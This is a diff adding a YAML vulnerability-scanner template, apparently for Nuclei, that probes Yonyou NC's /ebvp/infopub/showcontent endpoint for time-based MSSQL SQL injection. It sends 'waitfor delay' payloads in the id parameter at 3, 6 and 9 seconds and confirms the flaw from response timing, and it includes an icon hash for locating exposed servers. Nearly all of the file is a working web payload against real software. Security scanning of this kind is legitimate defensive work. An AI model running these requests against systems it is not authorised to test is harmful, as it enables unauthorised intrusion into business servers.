@@ -1,0 +1,40 @@
+id: yonyou-nc-showcontent-mssql-sqli
+info:
+  name: 用友NC-showcontent存在SQL注入漏洞
+  author: apple
+  severity: high
+  description: 用友NC-showcontent存在SQL注入漏洞,icon_hash="1085941792".
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /ebvp/infopub/showcontent?id=1'%20waitfor%20delay%20'0:0:3 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: identity
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+      - |-
+        GET /ebvp/infopub/showcontent?id=1'%20waitfor%20delay%20'0:0:6 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: identity
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+      - |-
+        GET /ebvp/infopub/showcontent?id=1'%20waitfor%20delay%20'0:0:9 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: identity
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
